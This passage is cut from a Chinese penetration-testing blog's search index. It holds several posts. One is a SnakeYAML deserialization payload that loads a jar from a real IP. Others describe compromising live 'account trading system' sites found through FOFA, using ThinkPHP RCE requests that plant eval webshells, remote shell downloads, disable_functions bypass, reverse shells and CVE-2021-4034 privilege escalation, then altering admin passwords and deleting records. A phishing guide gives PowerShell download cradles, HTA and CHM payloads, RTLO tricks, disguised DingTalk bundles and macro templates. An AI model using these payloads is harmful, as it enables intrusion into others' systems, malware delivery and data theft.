class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public String getProgram(String... statements) &#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public ScriptEngine getScriptEngine() &#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>进行编译</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">javac src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java   &#x2F;&#x2F;会生成一个AwesomeScriptEngineFactory.class文件</span><br><span class=\"line\">jar -cvf yaml-payload.jar -C src&#x2F; .\t\t&#x2F;&#x2F;将src目录下的文件打包为yaml-payload.jar的jar包</span><br></pre></td></tr></table></figure>\n\n<p>然后上传到vps上,并起一个python的web服务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -m http.server</span><br></pre></td></tr></table></figure>\n\n<p>后台添加定时任务，请求vps的jar包</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">org.yaml.snakeyaml.Yaml.load(&#39;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http:&#x2F;&#x2F;1.116.110.61:8000&#x2F;yaml-payload.jar&quot;]]]]&#39;)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest/9ea40d2d851e4c32abbc3d03714a1656.png\"></p>\n<p>vps监听端口 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">nc -lvvp 9000</span><br></pre></td></tr></table></figure>\n\n","categories":["渗透"]},{"title":"账户交易系统","url":"/2023/12/25/%E8%B4%A6%E6%88%B7%E4%BA%A4%E6%98%93%E7%B3%BB%E7%BB%9F/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>php5 怎么bypass disable_functions啊，disable太狠了，找到个php7的还提权失败</p>\n<p>FOFA</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">intitle:账户交易系统</span><br></pre></td></tr></table></figure>\n\n<a id=\"more\"></a>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//397788b042814302b02f98af636b7da5.png\"><br>发现thinkphp 版本</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//0547adaec6e9433abfe077ec6eeadbc7.png\"><br>直接getshell</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//04fc1decb79a4aec951029b83c9e1c99.png\"><br>url: /?s=index</p>\n<p>Post：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">s&#x3D;file_put_contents(&#39;test2.php&#39;,&#39;&lt;?php eval($_POST[a]);&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//5e8084265c2a402680439937d1a92aa4.png\"></p>\n<p>一看就是宝塔</p>\n<p>完蛋，tcl，不会利用，写了个脚本批量getshell，看能不能进一步操作</p>\n<p>换个目标 <code>tp3</code>的，看看网页源码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//f71ad536c6024a9bb008af4038bad23b.png\"></p>\n<p>发现两处处注入</p>\n<blockquote>\n<p>/index.php/index/alldeal.html</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//5cde4ede03264637864bfc04dc3fe03f.png\"><br>还有一处登录处</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//897fcde575cd4245850c895548467cfe.png\"><br>不是dba用户，可以查一下后台密码，登录上去看看</p>\n<p>又换了一个站点，tp5+php7，bypass disable_functions后，getshell，bash一句话反弹了一个www权限</p>\n<p>信息收集一下<br>cat /etc/*-release</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//7cf8f77a94cb476ba16a95cfc5e21921.png\"><br>下一步尝试提权，搜索可利用</p>\n<p><a href=\"https://github.com/InteliSecureLabs/Linux_Exploit_Suggester\">Linux_Exploit_Suggester</a></p>\n<p><a href=\"https://github.com/mzet-/linux-exploit-suggester\">linux-exploit-suggester</a></p>\n<p>启动：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.&#x2F;linux-exploit-suggester.sh</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//54ac13e3e8d749b087f28f1f192d8a9c.png\"><br>编译时出错：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//70e8ee47d06c4f1c852220ba68efc7ef.png\"><br>当出现：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">gcc: error trying to exec &#39;cc1&#39;: execvp: No such file or directory</span><br></pre></td></tr></table></figure>\n<p>添加个路径就行了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">find &#x2F; -name cc1</span><br><span class=\"line\">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;libexec&#x2F;gcc&#x2F;x86_64-redhat-linux&#x2F;4.8.2&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//8a8b174febdf49f2bc6439a9512968fe.png\"><br>尝试几次内核提权都没成功</p>\n<p>翻到了数据库文件连接一下</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//129c82fac933428eb4b9c967c2efb7fa.png\"><br>找到管理员密码，发现存在ip白名单，插入一条数据</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//06e20969fcef4f7a8141cb341392d1e5.png\"></p>\n<p>Md5解密发现要付费，很快啊，直接给他密码改喽</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//e32023e7355e44c0bc187da87785c201.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//b40acb3cc1cc43c5b2f05405f6a36d0c.png\"><br>没啥利用点，数据库记录删了</p>\n","categories":["渗透"]},{"title":"账户交易系统2","url":"/2023/12/25/%E8%B4%A6%E6%88%B7%E4%BA%A4%E6%98%93%E7%B3%BB%E7%BB%9F2/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>练练手</p>\n<a id=\"more\"></a>\n\n<h1 id=\"Getshell\"><a href=\"#Getshell\" class=\"headerlink\" title=\"Getshell\"></a>Getshell</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">fofa:&quot;账户交易系统&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//0dcb5a9ffc704a4f86e6ff73302afc8a.png\"></p>\n<p>发现为thinkphp的站点</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//a6e70702166c4f34ab7851ae442ca44f.png\"></p>\n<p>存在rce，php版本5.6</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//40a00044794f45ca95e4313a65c7d62c.png\"></p>\n<p>尝试直接写马：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">s&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?&#x3D;echomd5(1);&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert</span><br></pre></td></tr></table></figure>\n<p>发现无法写入，怀疑存在关键字过滤，查看当前路径文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">s&#x3D; var_dump(scandir(&#39;.&#x2F;&#39;))&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//df7b8adb87a641b59ed5f5f953f4ab68.png\"></p>\n<p>发现日志目录路径，尝试文件包含日志拿shell，发现日志内容全部被sql相关信息刷屏，故放弃</p>\n<p>尝试bypass关键字，利用base64编码+php短标签进行绕过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">s&#x3D;file_put_contents(&#39;2.txt&#39;,base64_decode(&#39;PHNjcmlwdCBsYW5ndWFnZT0icGhwIj5AZXZhbCgkX1BPU1RbYV0pO2VjaG8gbWQ1KDEpOzwvc2NyaXB0Pg&#x3D;&#x3D;&#39;))&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert</span><br></pre></td></tr></table></figure>\n<p>尝试文件包含</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">s&#x3D;2.txt&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;think\\__include_file&amp;a&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//6352637626204ec5a2189a63eb88e665.png\"></p>\n<p>尝试蚁剑连接，果然没加密流量连接失败，掏出rsa加密马或者随机时间马</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//ae9d12ddb71a47de92b35ae7e33f2942.png\"></p>\n<p>上传到vps，下载远程马</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">s&#x3D;copy(&#39;http:&#x2F;&#x2F;xxx&#x2F;rsa.php&#39;,&#39;3.txt&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert</span><br></pre></td></tr></table></figure>\n<p>添加信息进行文件包含</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">s&#x3D;2.txt&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;think\\__include_file&amp;密码</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//04a8b0ed3c3849d4a7f17894f69a7b94.png\"></p>\n<p>抓包看一下流量 </p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//a98cbf42c7414cf59d2268fe7401a43a.png\"></p>\n<p>在连接时发现了坑点，这几个参数post时参数顺序不一样竟然无法执行命令，即使更改蚁剑的body顺序也无济于事，所以蚁剑通过代理到bp进而匹配替换</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//23517601d1024b1bb62c19f339b96bcd.png\"></p>\n<p>这样不添加body也可以进行蚁剑操作</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//d44392ab3be74010ad532521dabc687e.png\"></p>\n<p>后面操作又出问题，修改文件时，顺序又错了，放弃蚁剑，掏出哥斯拉，直接左边追加数据，巨方便</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//a998c0076cc04bbc941dc8d140c0c9cc.png\"></p>\n<p>流量包也正确</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//de6f9defb79d4d81a964f82ba177a883.png\"></p>\n<h1 id=\"Bypass-disable\"><a href=\"#Bypass-disable\" class=\"headerlink\" title=\"Bypass_disable\"></a>Bypass_disable</h1><p>翻找文件，宝塔面板</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//7ff843650f904002bcdf7e31f1b2658c.png\"></p>\n<p>寻找php-fpm相关文件    <strong>/www/server/php/56/etc/php-fpm.conf</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//34b83b401d6f4718a032dbc59d7bc578.png\"></p>\n<p>Listen是在/tmp下的cgi<br>攻击tcp模式的方式显然不行，但是我们已经知道fpm 的 sock 文件的绝对路径。直接去交互他，或者用 unix:// 套接字的方式依然可行</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//b89462e3ed6d4884afdae045efbd690b.png\"></p>\n<p>填上fpm地址，执行了system</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//23ba45e858ec43d182f684d1b085296d.png\"></p>\n<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><p>反弹shell</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//f6731775e5484974a39f018a3660e991.png\"></p>\n<p>准备提权 CVE-2021-4034，将编译好的提权文件上传执行发现如下问题</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//2b145031fe4b4037858f56949105044d.png\"></p>\n<p>解决办法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">find &#x2F; -name cc1</span><br><span class=\"line\">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;libexec&#x2F;gcc&#x2F;x86_64-redhat-linux&#x2F;4.8.2&#x2F;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//202f714fbc494f809d85341c019f286e.png\"></p>\n<p>提权成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest//78710b3faa4347d5b4e574201a4349c0.png\"></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.cnblogs.com/one-seven/p/15194350.html\">Disable_functions绕过整合 - one-seven - 博客园 (cnblogs.com)</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/264896.html\">蚁剑流量分析及改造 - FreeBuf网络安全行业门户</a></p>\n<p><a href=\"https://forum.butian.net/share/1121\">奇安信攻防社区-Thinkphp5-rce-过宝塔小思路 (butian.net)</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/EfzSC979qQqXxXLZsV9LpA\">渗透中的后门利用 (qq.com)</a></p>\n","categories":["渗透"]},{"title":"钓鱼","url":"/2023/12/25/%E9%92%93%E9%B1%BC/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>红蓝对抗之钓鱼，尝试几种钓鱼方式</p>\n<a id=\"more\"></a>\n\n<h1 id=\"钓鱼小技巧\"><a href=\"#钓鱼小技巧\" class=\"headerlink\" title=\"钓鱼小技巧\"></a>钓鱼小技巧</h1><h2 id=\"LNK快捷方式\"><a href=\"#LNK快捷方式\" class=\"headerlink\" title=\"LNK快捷方式\"></a>LNK快捷方式</h2><p>lnk文件是用于指向其他文件的一种文件。这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。lnk钓鱼主要将图标伪装成正常图标，但是目标会执行shell命令。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603004753952.png\" alt=\"image-20220603004753952\"></p>\n<p>然后cs会生成powershell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;150.158.181.145:80&#x2F;a&#39;))&quot;</span><br></pre></td></tr></table></figure>\n\n<p>创建快捷方式</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603005235999.png\" alt=\"image-20220603005235999\"></p>\n<p>更改图标进行伪装</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">%SystemRoot%\\System32\\SHELL32.dll</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603005725670.png\" alt=\"image-20220603005725670\"></p>\n<h2 id=\"RTLO反转文件名\"><a href=\"#RTLO反转文件名\" class=\"headerlink\" title=\"RTLO反转文件名\"></a>RTLO反转文件名</h2><p>RTLO 字符全名为 “RIGHT-TO-LEFT OVERRIDE”，其本质是 unicode 字符。可以将任意语言的文字内容按倒序排列，最初是用来支持一些从右往左写的语言的文字，比如阿拉伯语，希伯来语。由于它可以重新排列字符的特性，会被攻击者利用从而达到欺骗目标</p>\n<p>将rtlo.exe(.scr等同于.exe)重命名为 rtlogpj.exe，然后再次重命名，在o和g中右键选择RLO即可</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603010907434.png\" alt=\"image-20220603010907434\"></p>\n<p>效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603011032557.png\" alt=\"image-20220603011032557\"></p>\n<h2 id=\"HTA\"><a href=\"#HTA\" class=\"headerlink\" title=\"HTA\"></a>HTA</h2><p>HTA是HTML Application的缩写（HTML应用程序），是软件开发的新概念，直接将HTML保存成HTA的格式，就是一个独立的应用软件，本身就是html应用程序，双击就能运行，却比普通网页权限大得多，它具有桌面程序的所有权限，与VB、C++等程序语言所设计的软件界面没什么差别。</p>\n<p>新建一个后缀为 .hta的HTA，输入以下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!--example1.hta--&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;title&gt;test&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">p&#123;</span><br><span class=\"line\">font-size:24;</span><br><span class=\"line\">cursor:hand&#125;</span><br><span class=\"line\">&lt;&#x2F;style&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;center&gt;</span><br><span class=\"line\">&lt;p&gt;</span><br><span class=\"line\">HTA</span><br><span class=\"line\">HTMLApplication</span><br><span class=\"line\">test</span><br><span class=\"line\">&lt;&#x2F;p&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>运行</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603011755241.png\" alt=\"image-20220603011755241\"></p>\n<p>CS可以直接生成</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603011823918.png\" alt=\"image-20220603011823918\"></p>\n<p>有三种方式的利用方式</p>\n<p>powershell：执行powershell语句</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">language</span>=<span class=\"string\">&quot;VBScript&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">\t<span class=\"built_in\">Function</span> var_func()</span></span><br><span class=\"line\">\t\tDim var_shell</span><br><span class=\"line\"><span class=\"javascript\">\t\t<span class=\"built_in\">Set</span> var_shell = CreateObject(<span class=\"string\">&quot;Wscript.Shell&quot;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">\t\tvar_shell.run <span class=\"string\">&quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQ......&quot;</span>, <span class=\"number\">0</span>, <span class=\"literal\">true</span></span></span><br><span class=\"line\"><span class=\"javascript\">\tEnd <span class=\"built_in\">Function</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\tvar_func</span><br><span class=\"line\">\tself.close</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>exe：将shellcode写入到exe中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603012135520.png\" alt=\"image-20220603012135520\"></p>\n<p>VBA：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603012324162.png\" alt=\"image-20220603012324162\"></p>\n<h2 id=\"CHM\"><a href=\"#CHM\" class=\"headerlink\" title=\"CHM\"></a>CHM</h2><p>CHM（Compiled Help Manual）即 “已编译的帮助文件”。它是微软新一代的帮助文件格式，利用 HTML 作源文，把帮助内容以类似数据库的形式编译储存。CHM 支持 Javascript、VBscript、ActiveX、Java Applet、Flash、常见图形文件(GIF、JPEG、PNG)、音频视频文件(MID、WAV、AVI)等等，并可以通过 URL 与 Internet 联系在一起。因为使用方便，形式多样也被采用作为电子书的格式。主要针对windows利用</p>\n<p>利用需要用到 <a href=\"http://www.etextwizard.com/\">EasyCHM</a></p>\n<p>新建html然后填入代码，CS上线，利用web delivery</p>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class=\"line\">command exec </span><br><span class=\"line\">&lt;OBJECT id=x classid=<span class=\"string\">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> width=<span class=\"number\">1</span> height=<span class=\"number\">1</span>&gt;</span><br><span class=\"line\">&lt;PARAM name=<span class=\"string\">&quot;Command&quot;</span> value=<span class=\"string\">&quot;ShortCut&quot;</span>&gt;</span><br><span class=\"line\"> &lt;PARAM name=<span class=\"string\">&quot;Button&quot;</span> value=<span class=\"string\">&quot;Bitmap::shortcut&quot;</span>&gt;</span><br><span class=\"line\"> &lt;PARAM name=<span class=\"string\">&quot;Item1&quot;</span> value=<span class=\"string\">&quot;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http://ip:80/a&#x27;))&quot;</span>&gt;</span><br><span class=\"line\"> &lt;PARAM name=<span class=\"string\">&quot;Item2&quot;</span> value=<span class=\"string\">&quot;273,1,1&quot;</span>&gt;</span><br><span class=\"line\">&lt;/OBJECT&gt;</span><br><span class=\"line\">&lt;SCRIPT&gt;</span><br><span class=\"line\">x.Click();</span><br><span class=\"line\">&lt;/SCRIPT&gt;</span><br><span class=\"line\">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>导入项目</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603013308516.png\" alt=\"image-20220603013308516\"></p>\n<p>然后编译</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603014023391.png\" alt=\"image-20220603014023391\"></p>\n<p>先将一个正常的chm文档下载，利用hh命令转为html，然后将payload嵌入，再生成chm，<a href=\"https://blog.csdn.net/weixin_42131443/article/details/112719415\">红队攻防之CHM文档钓鱼</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hh -decompile .\\\\html CSS2.0中文手册.chm</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"自解压捆绑\"><a href=\"#自解压捆绑\" class=\"headerlink\" title=\"自解压捆绑\"></a>自解压捆绑</h2><p>将CS的马和正常软件，利用winrar进行压缩</p>\n<p>1.创建自解压格式压缩文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603022452804.png\" alt=\"image-20220603022452804\"></p>\n<p>2.高级-&gt;自解压选项</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603021013141.png\" alt=\"image-20220603021013141\"></p>\n<p>3.选项设置</p>\n<p>解压路径填temp目录</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603022529409.png\" alt=\"image-20220603022529409\"></p>\n<p>在 设置 中的解压后运行”输入要运行的程序</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603022618207.png\" alt=\"image-20220603022618207\"></p>\n<p>在 模式 中 安静模式 选择 全部隐藏 。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603021232524.png\" alt=\"image-20220603021232524\"></p>\n<p>在 更新 中的 更新方法 选择 解压并更新文件 ，覆盖方式 中选择 覆盖所有文件 。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603021130783.png\" alt=\"image-20220603021130783\"></p>\n<p>重命名为dingding.exe，可以再换个图标，然后和钉钉混淆再次压缩</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603021959459.png\" alt=\"image-20220603021959459\"></p>\n<p>然后解压</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603022805140.png\" alt=\"image-20220603022805140\"></p>\n<p>然后发送给鱼儿，鱼儿点击dingding.exe后就上线</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603023003573.png\" alt=\"image-20220603023003573\"></p>\n<h1 id=\"Office钓鱼\"><a href=\"#Office钓鱼\" class=\"headerlink\" title=\"Office钓鱼\"></a>Office钓鱼</h1><h2 id=\"word宏\"><a href=\"#word宏\" class=\"headerlink\" title=\"word宏\"></a>word宏</h2><p>CS生成</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603025630292.png\" alt=\"image-20220603025630292\"></p>\n<p>msf生成</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -pwindows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.2.148 LPORT&#x3D;4444-fvba -ovba.txt</span><br></pre></td></tr></table></figure>\n\n<p>复制vba代码后，新建word，选择自定义功能区</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603030108163.png\" alt=\"image-20220603030108163\"></p>\n<p>点击开发工具 Visual Basic -&gt;ThisDocument。填入宏代码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603102631798.png\" alt=\"image-20220603102631798\"></p>\n<p>另存为.doc文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603103238408.png\" alt=\"image-20220603103238408\"></p>\n<p>默认为禁用宏，诱导用户点击启用内容</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603103328778.png\" alt=\"image-20220603103328778\"></p>\n<p>关于宏的免杀还需要下一步的学习</p>\n<h2 id=\"远程模板注入宏代码\"><a href=\"#远程模板注入宏代码\" class=\"headerlink\" title=\"远程模板注入宏代码\"></a>远程模板注入宏代码</h2><p>注入代码同上，另存为.dotm，上传到vps中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603104855200.png\" alt=\"image-20220603104855200\"></p>\n<p>现在需要一个通过网络来加载一个word模板的文件，最简单的方式就是通过word的联机模板，打开word，新建模板</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603113503210.png\" alt=\"image-20220603113503210\"></p>\n<p>保存后重命名为zip，修改 word\\_rels\\settings.xml.rels</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt;</span><br><span class=\"line\">&lt;Relationships xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;package&#x2F;2006&#x2F;relationships&quot;&gt;&lt;Relationship Id&#x3D;&quot;rId1&quot; Type&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;officeDocument&#x2F;2006&#x2F;relationships&#x2F;attachedTemplate&quot; Target&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;C:\\Users\\AppData\\Local\\Microsoft\\Office\\16.0\\DTS\\zh-CN%7b5806EEF6-D82C-4B79-ABDC-924FDE8ECC47%7d\\%7bB273A1DB-3538-43EA-B625-4111FB66BA2A%7dtf16392715_win32.dotx&quot; TargetMode&#x3D;&quot;External&quot;&#x2F;&gt;&lt;&#x2F;Relationships&gt;</span><br></pre></td></tr></table></figure>\n\n<p>包含带有attachmentTemplate的Type的Relationship标记，是告诉Word打开该.docx时从哪里加载模板的设置，我们可以将Target值修改为远程位置。SMB也可以利用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603114248366.png\" alt=\"image-20220603114248366\"></p>\n<p>vps收到远程请求，点击启用宏即可上线</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603114443215.png\" alt=\"image-20220603114443215\"></p>\n<h2 id=\"CVE-2017-11882\"><a href=\"#CVE-2017-11882\" class=\"headerlink\" 